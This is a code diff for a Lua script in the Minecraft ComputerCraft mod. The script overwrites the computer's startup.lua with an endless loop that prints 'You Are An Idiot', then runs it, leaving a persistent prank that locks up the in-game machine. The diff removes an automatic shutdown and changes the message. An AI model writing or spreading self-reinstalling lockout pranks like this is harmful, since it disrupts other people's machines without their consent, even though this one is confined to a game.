@@ -1,6 +1,6 @@
 fs.delete("startup.lua")
-
 while true do
+
 
 local VF = fs.open("startup.lua", "w")
 
@@ -10,20 +10,21 @@ local VS = [[
  while true do
   for y = 1, 10 do
    term.setCursorPos(1, y)
-   print("ShuttyDowny Has been doing stuff")
-   os.sleep(0.7)
+   print("You Are An Idiot")
    term.setCursorPos(1, y + 1)
-   print("ShuttyDowny Has been doing stuff")
+   print("You Are An Idiot")
    if y > 10 then
      term.clear()
-     os.shutdown()
    end
   end
  end
+end
 ]]
 
 VF.write(VS)
 VF.close()
+
+term.clear()
 
 shell.run("startup.lua")
 
